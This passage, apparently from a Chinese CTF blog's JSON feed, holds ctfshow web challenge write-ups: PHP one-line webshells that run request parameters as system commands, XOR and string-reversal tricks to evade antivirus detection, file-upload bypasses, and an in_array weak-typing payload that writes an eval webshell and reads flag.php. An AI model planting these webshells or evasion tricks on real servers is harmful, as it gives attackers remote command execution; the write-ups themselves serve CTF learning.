punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'metsys'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>更多的关于免杀</p>\n<ol>\n<li>\n<p>字符串拼接</p>\n</li>\n<li>\n<p>利用异或，使用其他符号构建字符串 如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//ABCDEFG</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$b</span></span>)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//abcdefg</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//hijklmn</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//opqrst</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uvwxyz</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$h</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">')'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'*'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'2'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'3'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'4'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'5'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'6'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'7'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'8'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$l</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\t'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$A</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span> <span class=\"token operator\">&lt;=</span> <span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$$A</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></li>\n</ol>\n</li>\n</ul>\n<p>web161  <code>content-type</code>  为 <code>png</code> ，文件头为 <code>GIF89a</code>  绕过</p>\n<p>web166 上传 zip，然后输入一句话</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/php%20%E7%89%B9%E6%80%A7/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/php%20%E7%89%B9%E6%80%A7/",
            "title": "php 特性",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-98\"><a class=\"anchor\" href=\"#web-98\">#</a> web 98</h1>\n<p>根据源码，可知，当传入 get 参数时。会将 get 改为 post 参数（后面的 get 会变成 post，即 highlight_file () 的判断 get 参数时，会判断 post 参数下的值)</p>\n<p>所以说该题的解是，先随便传入一个 get 值，之后通过 post 传入 <code>HTTP_FLAG=flag</code></p>\n<h1 id=\"web-99\"><a class=\"anchor\" href=\"#web-99\">#</a> web 99</h1>\n<p>关键在于</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这题主要是运用了 <code>in_array()</code>  的弱类型匹配</p>\n<p>故可以写</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?n&#x3D;1.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>content&#x3D;&lt;?php eval($GET[1]);?&gt;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1&#x3D;systme(&#39;ls&#39;);</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>1&#x3D;system(&#39;tac flag.php&#39;);</pre></td></tr></table></figure><h1 id=\"web-100\"><a class=\"anchor\" href=\"#web-100\">#</a> web 100</h1>\n<p><code>$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code></p>\n<p>这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故 <code>v0</code>  